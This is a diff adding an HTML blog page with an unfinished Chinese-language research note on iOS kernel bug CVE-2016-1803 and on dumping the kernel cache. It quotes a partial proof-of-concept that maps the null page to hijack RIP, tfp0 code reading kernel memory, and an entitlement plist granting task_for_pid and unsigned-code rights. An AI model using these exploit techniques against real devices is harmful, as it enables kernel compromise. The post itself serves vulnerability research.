@@ -1,0 +1,291 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+	<h1>
+    <a href="/" id="title"></a>
+	</h1>
+	</div>
+<div id="md" style="display: none;">
+<!-- markdown -->
+###CVE-2016-1803
+翻看iOS9.3近期的security list的时候，选了这么一个CVE来研究一下，它的漏洞描述比较清晰，也能找到已有的POC代码帮助理解。  
+通过向`CoreCaptureUserClient::stashGet`传递一个人为控制的参数，可以让它返回一个空指针，这个空指针会被随后未经检查地调用(具体怎么调用还没有弄明白)，如果我们能够在空指针页填入数据，就可以达到控制RIP的目的。  
+<pre><code>int main(int argc, char** argv){
+  `kern_return_t err;`
+  // re map the null page rw
+  int var = 0;
+  `err = vm_deallocate(mach_task_self(), 0x0, 0x1000);`
+  `if (err != KERN_SUCCESS){`
+    printf("%x\n", err);
+  }
+  `vm_address_t addr = 0;`
+  `err = vm_allocate(mach_task_self(), &addr, 0x1000, 0);`
+  `if (err != KERN_SUCCESS){`
+    `if (err == KERN_INVALID_ADDRESS){`
+      printf("invalid address\n");
+    }
+    `if (err == KERN_NO_SPACE){`
+      printf("no space\n");
+    }
+    printf("%x\n", err);
+  }
+  char* np = 0;
+  for (int i = 0; i < 0x1000; i++){
+    np[i] = '\xff';
+  }
+  `*((uint64_t*)0x28) = 0xffffff4141414141;`
+  OSSpinLockLock(&lock);
+  `pthread_t t;`
+  `pthread_create(&t, NULL, thread_func, NULL);`
+  `mach_port_t conn = get_user_client("IOAudioEngine", 0);`
+  `set_params(conn);`
+  OSSpinLockUnlock(&lock);
+  IOServiceClose(conn);
+}
+</code></pre>
+在64位的系统上，需要使用`gcc -m32 -Wl,-pagezero_size,0 -O3`来编译一个32位的版本，这样才能map null page。  
+然而实际review代码可以看到，这里打开的是一个名为`IOAudioEngine`的Client，并且调用了它的0号selector，并不是描述里所说的`CoreCaptureUserClient::stashGet`，实际测试也没有在预期的地方发生panic。  
+于是就考虑这里是不是POC有误或者是`IOAudioEngine`里面又调用了`CoreCaptureUserClient `的方法。
+###KernelCache Dump  
+碰到上面的问题，就希望能够从内核中找出可用的信息； 受到`Find-Your-Own-iOS-Kernel-Bug.pdf`的启发，一开始我尝试使用这样的代码来把内核内存给dump出来：  
+<pre><code>   `kret = task_for_pid(mach_task_self(), 0, &kernel_task);`
+   `if (kret == KERN_SUCCESS) {`
+      printf("[x]tfp0 attach success!\n");
+   } else {
+      `printf("[!]tfp0 failed with message %s!\n", mach_error_string(kret));`
+      exit(0);
+   }
+   for (addr = 0x80000000; addr < 0x81F02000; addr += bufsiz) {
+      printf("reading aaaat : %x\n", addr);
+      `kret = vm_read(kernel_task, addr, bufsiz, &buf, &sz);`
+      `if (kret != KERN_SUCCESS) {`
+         `printf("vm_read failed : %x\n", kret);`
+         return -1;
+      }
+      if (!buf || sz == 0) {
+         printf("continue at %x\n", addr);
+         continue;
+      } 
+      printf("finish reading it \n");
+   }
+</pre></code>
+
+使用ldid -Sent.xml [bin] 把entitlement嵌入二进制中:
+<pre><code>`<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">`
+`<plist version="1.0">`
+`<dict>`
+	`<key>com.apple.springboard.debugapplications</key>`
+	`<true/>`
+	`<key>get-task-allow</key>`
+	`<true/>`
+	`<key>task_for_pid-allow</key>`
+	`<true/>`
+	`<key>proc_info-allow</key>`
+	`<true/>`
+	`<key>run-unsigned-code</key>`
+	`<true/>`
+`</dict>`
+`</plist>`</pre></code>
+运行之后，会发现，在读取到某个位置的内存时，设备就会发生panic然后重启。  
+这里的问题应该是，我试图读取0x80000000开始的一片连续内存，但是实际上可能不是的。如果读取到的某一片内存是unmapped，就会触发这样的panic。  
+后来考虑过使用通过vmmap相关的API来找"FEEDFACE"找到了这个[dump.c](https://github.com/Siguza/ios-kern-utils/blob/master/tools/kdump.c).  
+它的原理是通过`vm_region_recurse_64`依次遍历内核的map里面的region，找到一个满足size>1GB,且rwx的权限设置为---的，认为这就是kernel base。  
+针对不同的平台，越过`IMAGE_OFFSET`可以找到`image_header`,根据这个header里面的vmaddr、filesize等字段，可以把内核的data全部都dump出来。  
+###xxxx  
+1.把内核给dump出来了，通过kextstat来显示出内存中加载的内核扩展:
+<pre><code>`graysn0wdeMac:~ graysn0w$ kextstat | grep apture
+   82    1 0xffffff7f818e9000 0x22000    0x22000    com.apple.driver.corecapture (1.0.4) 16BA9642-2B81-3FEC-BB6F-FE8E8039DDDF <7 6 5 4 3 1>
+   83    0 0xffffff7f81913000 0x7000     0x7000     com.apple.driver.CoreCaptureResponder (1) D71C8900-BCBC-3B5D-9F9C-077C3B29DF70 <82 7 6 5 4 3 1>`</pre></code>  
+但是iOS上没有kextstat这个程序，需要自己实现一个  
+2.如何在dump出来的内核代码里面添加调试符号呢？
+<!-- markdown end -->
+</div>
+<div class="entry" id="main">
+<!-- content -->
+<h3 id="cve20161803">CVE-2016-1803</h3>
+
+<p>翻看iOS9.3近期的security list的时候，选了这么一个CVE来研究一下，它的漏洞描述比较清晰，也能找到已有的POC代码帮助理解。 <br>
+通过向<code>CoreCaptureUserClient::stashGet</code>传递一个人为控制的参数，可以让它返回一个空指针，这个空指针会被随后未经检查地调用(具体怎么调用还没有弄明白)，如果我们能够在空指针页填入数据，就可以达到控制RIP的目的。  </p>
+
+<pre><code>int main(int argc, char** argv){
+  `kern_return_t err;`
+  // re map the null page rw
+  int var = 0;
+  `err = vm_deallocate(mach_task_self(), 0x0, 0x1000);`
+  `if (err != KERN_SUCCESS){`
+    printf("%x\n", err);
+  }
+  `vm_address_t addr = 0;`
+  `err = vm_allocate(mach_task_self(), &amp;addr, 0x1000, 0);`
+  `if (err != KERN_SUCCESS){`
+    `if (err == KERN_INVALID_ADDRESS){`
+      printf("invalid address\n");
+    }
+    `if (err == KERN_NO_SPACE){`
+      printf("no space\n");
+    }
+    printf("%x\n", err);
+  }
+  char* np = 0;
+  for (int i = 0; i &lt; 0x1000; i++){
+    np[i] = '\xff';
+  }
+  `*((uint64_t*)0x28) = 0xffffff4141414141;`
+  OSSpinLockLock(&amp;lock);
+  `pthread_t t;`
+  `pthread_create(&amp;t, NULL, thread_func, NULL);`
+  `mach_port_t conn = get_user_client("IOAudioEngine", 0);`
+  `set_params(conn);`
+  OSSpinLockUnlock(&amp;lock);
+  IOServiceClose(conn);
+}
+</code></pre>
+
+<p>在64位的系统上，需要使用<code>gcc -m32 -Wl,-pagezero_size,0 -O3</code>来编译一个32位的版本，这样才能map null page。 <br>
+然而实际review代码可以看到，这里打开的是一个名为<code>IOAudioEngine</code>的Client，并且调用了它的0号selector，并不是描述里所说的<code>CoreCaptureUserClient::stashGet</code>，实际测试也没有在预期的地方发生panic。 <br>
+于是就考虑这里是不是POC有误或者是<code>IOAudioEngine</code>里面又调用了<code>CoreCaptureUserClient</code>的方法。</p>
+
+<h3 id="kernelcachedump">KernelCache Dump</h3>
+
+<p>碰到上面的问题，就希望能够从内核中找出可用的信息； 受到<code>Find-Your-Own-iOS-Kernel-Bug.pdf</code>的启发，一开始我尝试使用这样的代码来把内核内存给dump出来： <br>
+</p><pre><code>   <code>kret = task_for_pid(mach_task_self(), 0, &amp;kernel_task);</code>
+   <code>if (kret == KERN_SUCCESS) {</code>
+      printf("[x]tfp0 attach success!\n");
+   } else {
+      <code>printf("[!]tfp0 failed with message %s!\n", mach_error_string(kret));</code>
+      exit(0);
+   }
+   for (addr = 0x80000000; addr &lt; 0x81F02000; addr += bufsiz) {
+      printf("reading aaaat : %x\n", addr);
+      <code>kret = vm_read(kernel_task, addr, bufsiz, &amp;buf, &amp;sz);</code>
+      <code>if (kret != KERN_SUCCESS) {</code>
+         <code>printf("vm_read failed : %x\n", kret);</code>
+         return -1;
+      }
+      if (!buf || sz == 0) {
+         printf("continue at %x\n", addr);
+         continue;
+      } 
+      printf("finish reading it \n");
+   }
+</code></pre><p></p>
+
+<p>使用ldid -Sent.xml [bin] 把entitlement嵌入二进制中:
+</p><pre><code><code>&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</code>
+<code>&lt;plist version="1.0"&gt;</code>
+<code>&lt;dict&gt;</code>
+    <code>&lt;key&gt;com.apple.springboard.debugapplications&lt;/key&gt;</code>
+    <code>&lt;true/&gt;</code>
+    <code>&lt;key&gt;get-task-allow&lt;/key&gt;</code>
+    <code>&lt;true/&gt;</code>
+    <code>&lt;key&gt;task_for_pid-allow&lt;/key&gt;</code>
+    <code>&lt;true/&gt;</code>
+    <code>&lt;key&gt;proc_info-allow&lt;/key&gt;</code>
+    <code>&lt;true/&gt;</code>
+    <code>&lt;key&gt;run-unsigned-code&lt;/key&gt;</code>
+    <code>&lt;true/&gt;</code>
+<code>&lt;/dict&gt;</code>
+<code>&lt;/plist&gt;</code></code></pre>
+运行之后，会发现，在读取到某个位置的内存时，设备就会发生panic然后重启。 <br>
+这里的问题应该是，我试图读取0x80000000开始的一片连续内存，但是实际上可能不是的。如果读取到的某一片内存是unmapped，就会触发这样的panic。 <br>
+后来考虑过使用通过vmmap相关的API来找"FEEDFACE"找到了这个<a href="https://github.com/Siguza/ios-kern-utils/blob/master/tools/kdump.c">dump.c</a>. <br>
+它的原理是通过<code>vm_region_recurse_64</code>依次遍历内核的map里面的region，找到一个满足size&gt;1GB,且rwx的权限设置为---的，认为这就是kernel base。 <br>
+针对不同的平台，越过<code>IMAGE_OFFSET</code>可以找到<code>image_header</code>,根据这个header里面的vmaddr、filesize等字段，可以把内核的data全部都dump出来。  <p></p>
+
+<h3 id="xxxx">xxxx</h3>
+
+<p>1.把内核给dump出来了，通过kextstat来显示出内存中加载的内核扩展:
+</p><pre><code><code>graysn0wdeMac:~ graysn0w$ kextstat | grep apture
+   82    1 0xffffff7f818e9000 0x22000    0x22000    com.apple.driver.corecapture (1.0.4) 16BA9642-2B81-3FEC-BB6F-FE8E8039DDDF &lt;7 6 5 4 3 1&gt;
+   83    0 0xffffff7f81913000 0x7000     0x7000     com.apple.driver.CoreCaptureResponder (1) D71C8900-BCBC-3B5D-9F9C-077C3B29DF70 &lt;82 7 6 5 4 3 1&gt;</code></code></pre> <br>
+但是iOS上没有kextstat这个程序，需要自己实现一个 <br>
+2.如何在dump出来的内核代码里面添加调试符号呢？<p></p>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2014 by isnowfy, Designed by isnowfy</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "kerneldump.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
